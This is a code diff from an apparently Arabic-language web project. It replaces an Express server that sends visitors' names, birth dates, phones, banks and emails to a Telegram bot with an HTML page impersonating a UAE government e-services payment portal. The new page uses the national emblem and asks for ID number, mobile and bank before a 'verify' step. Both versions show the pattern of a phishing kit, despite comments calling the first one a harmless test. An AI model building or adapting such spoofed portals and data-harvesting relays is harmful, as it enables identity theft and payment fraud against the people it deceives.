@@ -1,217 +1,124 @@
-/**
- * app.js
- * --- خادم Express واحد (ملف واحد) يقدم واجهة HTML ويُرسل بيانات غير حساسة إلى Telegram.
- *
- * تشغيل:
- * 1) npm init -y
- * 2) npm install express axios
- * 3) تعيين المتغيرات البيئية:
- *    - TELEGRAM_BOT_TOKEN  (مثال: 8175... )
- *    - TELEGRAM_CHAT_ID    (مثال: 8404960059)
- *    يمكنك تشغيله مؤقتًا في bash: 
- *      TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." node app.js
- * 4) افتح http://localhost:3000
- *
- * ملاحظة أمنية مهمة: هذا الكود **يتجاهل** الحقول الحساسة (cardNumber, cvv) ولا يرسلها.
- */
-
-const express = require('express');
-const axios = require('axios');
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-// Parse JSON body
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// صفحة HTML مدمجة — تصميم RTL مشابه الذي استخدمتَه
-const htmlPage = `<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!-- page1.html -->
+<!DOCTYPE html>
+<html lang="ar">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>بوابة الدفع - تجريبي (ملف واحد)</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
   <style>
-    body{font-family:Arial,Helvetica,sans-serif;direction:rtl;background:#f5f5f5;margin:0;padding:0}
-    header, footer{background:#004080;color:#fff;text-align:center;padding:18px 0}
-    .wrap{max-width:720px;margin:18px auto;padding:18px}
-    .card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 0 10px rgba(0,0,0,0.08);margin-bottom:18px}
-    h1{margin:0 0 12px;font-size:20px;color:#0b61c2;text-align:center}
-    form{max-width:520px;margin:0 auto}
-    label{display:block;margin-top:10px;font-weight:600}
-    input, select, button, textarea{width:100%;padding:10px;margin-top:6px;box-sizing:border-box;border-radius:6px;border:1px solid #ddd;font-size:15px}
-    button{background:#004080;color:#fff;border:none;cursor:pointer;padding:12px;border-radius:6px;font-weight:700}
-    .small{font-size:13px;color:#666;text-align:center;margin-top:12px}
-    .dob{display:flex;gap:8px}
-    .dob input{flex:1}
-    .row{display:flex;gap:8px;align-items:center}
-    .col{flex:1}
-    .error{color:#b00020;font-size:13px;display:none;margin-top:8px}
-    select.bank-select{
-      appearance:none;-webkit-appearance:none;-moz-appearance:none;
-      background-image: linear-gradient(45deg, transparent 50%, #666 50%),
-                        linear-gradient(135deg, #666 50%, transparent 50%);
-      background-position: calc(1.2rem) center, calc(2rem) center;
-      background-size: 6px 6px;
-      background-repeat: no-repeat;
-      padding-left:42px;
+    body {
+      font-family: Tahoma, Arial, sans-serif;
+      direction: rtl;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
     }
-    .note-safe{color:#0b61c2;font-size:13px;margin-top:10px}
+    header {
+      text-align: center;
+      padding: 20px;
+    }
+    header img {
+      height: 80px;
+    }
+    main {
+      padding: 20px;
+    }
+    form {
+      max-width: 400px;
+      margin: auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 6px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background: #0b5320;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #083d18;
+    }
+    footer {
+      background: #000;
+      color: #fff;
+      padding: 20px;
+      font-size: 13px;
+    }
+    footer ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    footer li {
+      margin: 5px 0;
+    }
   </style>
 </head>
 <body>
-  <header><div class="wrap center"><div style="font-weight:800">بوابة الدفع الآمنة — تجريبي</div></div></header>
-  <main class="wrap">
-    <section class="card">
-      <h1>النموذج (تجريبي)</h1>
-      <form id="theForm">
-        <label>الاسم الكامل</label>
-        <input name="fullName" required />
 
-        <label>نوع الهوية</label>
-        <select name="idType" required>
-          <option value="">اختر نوع الهوية</option>
-          <option value="هوية اماراتية">الهوية الإماراتية</option>
-          <option value="جواز سفر">جواز السفر</option>
-        </select>
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار الإمارات">
+    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
+    <p>حكومة الامارات العربية المتحدة</p>
+  </header>
 
-        <label>تاريخ الميلاد (يوم)</label>
-        <div class="dob">
-          <input name="day" type="number" placeholder="يوم" min="1" max="31" required />
-          <input name="month" type="number" placeholder="شهر" min="1" max="12" required />
-          <input name="year" type="number" placeholder="سنة" min="1900" max="2100" required />
-        </div>
+  <main>
+    <form action="verify.html" method="get">
+      <label>الاسم بالكامل *</label>
+      <input type="text" name="fullname" required>
 
-        <label>رقم الجوال</label>
-        <input name="phone" type="tel" required />
+      <label>رقم الهوية *</label>
+      <input type="text" name="idnumber" required>
 
-        <label>اختر البنك</label>
-        <select name="bank" class="bank-select" required>
-          <option value="">— اختر البنك —</option>
-          <option>بنك أبوظبي الأول</option>
-          <option>مصرف أبوظبي الإسلامي</option>
-          <option>بنك أبوظبي التجاري</option>
-          <option>بنك الإمارات دبي الوطني</option>
-          <option>بنك دبي الإسلامي</option>
-          <option>بنك المشرق</option>
-          <option>مصرف الشارقة الإسلامي</option>
-          <option>بنك عجمان</option>
-          <option>مصرف الهلال</option>
-          <option>HSBC</option>
-        </select>
+      <label>رقم الجوال *</label>
+      <input type="tel" name="mobile" required>
 
-        <label>البريد الإلكتروني</label>
-        <input name="email" type="email" required />
+      <label>ادخل البنك الخاص بك *</label>
+      <select name="bank" required>
+        <option value="">اختر البنك</option>
+        <option>بنك أبوظبي الأول</option>
+        <option>بنك الإمارات دبي الوطني</option>
+        <option>بنك المشرق</option>
+        <option>بنك دبي الإسلامي</option>
+        <option>بنك أبوظبي التجاري</option>
+      </select>
 
-        <label>رقم الحجز (6 أرقام)</label>
-        <input name="booking" maxlength="6" pattern="\\d{6}" />
+      <label>قيمة رسوم السداد (درهم إماراتي) *</label>
+      <input type="number" name="amount" required>
 
-        <!-- الحقول التالية موجودة للعرض فقط — سيتم تجاهلها server-side -->
-        <label>رقم البطاقة (عرض فقط — سيُتجاهل)</label>
-        <input name="cardNumber" placeholder="1234-5678-9012-3456"/>
-
-        <label>CVV (عرض فقط — سيُتجاهل)</label>
-        <input name="cvv" placeholder="***"/>
-
-        <div class="note-safe">أمان: الحقول الحساسة مثل رقم البطاقة و CVV **لن** تُرسل إلى تيليجرام.</div>
-
-        <button type="submit">إرسال للتجريب</button>
-      </form>
-      <p id="status" class="small"></p>
-    </section>
+      <button type="submit">المتابعة</button>
+    </form>
   </main>
-  <footer><div class="wrap center">جميع الحقوق محفوظة © 2025</div></footer>
 
-  <script>
-    document.getElementById('theForm').addEventListener('submit', async function(e){
-      e.preventDefault();
-      const form = e.target;
-      const data = Object.fromEntries(new FormData(form).entries());
+  <footer>
+    <ul>
+      <li>سياسة الخصوصية</li>
+      <li>حقوق النشر</li>
+      <li>شروط الاستخدام</li>
+      <li>معايير WCAG 2.0 AAA</li>
+      <li>© حكومة الإمارات جميع الحقوق محفوظة 2025</li>
+    </ul>
+  </footer>
 
-      // إرسال فقط الحقول الآمنة إلى الخادم
-      const safe = {
-        fullName: data.fullName || '',
-        idType: data.idType || '',
-        birth: (data.day||'') + '/' + (data.month||'') + '/' + (data.year||''),
-        phone: data.phone || '',
-        bank: data.bank || '',
-        email: data.email || '',
-        booking: data.booking || ''
-      };
-
-      try {
-        const res = await fetch('/submit', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify(safe)
-        });
-        if (!res.ok) throw new Error(await res.text());
-        document.getElementById('status').innerText = '✅ تم الإرسال إلى البوت (تجريبي)';
-      } catch (err) {
-        console.error(err);
-        document.getElementById('status').innerText = '❌ فشل الإرسال، تحقق من الخادم';
-      }
-    });
-  </script>
 </body>
-</html>`;
-
-// Serve main page
-app.get('/', (req, res) => {
-  res.type('html').send(htmlPage);
-});
-
-// Endpoint يستقبل الحقول الآمنة ويرسلها إلى Telegram
-app.post('/submit', async (req, res) => {
-  try {
-    const BOT = process.env.TELEGRAM_BOT_TOKEN;
-    const CHAT = process.env.TELEGRAM_CHAT_ID;
-    if (!BOT || !CHAT) {
-      return res.status(500).send('Bot token or chat id not configured on server.');
-    }
-
-    // الحقول الواردة — فقط الآمنة
-    const {
-      fullName = '',
-      idType = '',
-      birth = '',
-      phone = '',
-      bank = '',
-      email = '',
-      booking = ''
-    } = req.body || {};
-
-    // نبني نصًا للرسالة (غير حساس)
-    const message =
-`🔔 رسالة تجريبية من واجهة الدفع (آمنة)
-👤 الاسم: ${escape(fullName)}
-🆔 نوع الهوية: ${escape(idType)}
-🎂 تاريخ الميلاد: ${escape(birth)}
-📱 الجوال: ${escape(phone)}
-🏦 البنك: ${escape(bank)}
-✉️ البريد: ${escape(email)}
-🔢 رقم الحجز: ${escape(booking)}`;
-
-    // أرسل الرسالة إلى Telegram باستخدام التوكن من البيئة
-    const url = `https://api.telegram.org/bot${BOT}/sendMessage`;
-    const resp = await axios.post(url, { chat_id: CHAT, text: message });
-
-    if (resp.data && resp.data.ok) {
-      return res.json({ ok: true });
-    } else {
-      return res.status(502).json({ ok: false, error: resp.data });
-    }
-  } catch (err) {
-    console.error('Failed sending to Telegram:', err?.response?.data || err.message || err);
-    return res.status(500).send('Server error sending to Telegram');
-  }
-});
-
-// helper escape to avoid injection in message
-function escape(str){
-  return String(str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-}
-
-app.listen(PORT, () => {
-  console.log(`✅ Running on http://localhost:${PORT}`);
-});
+</html>
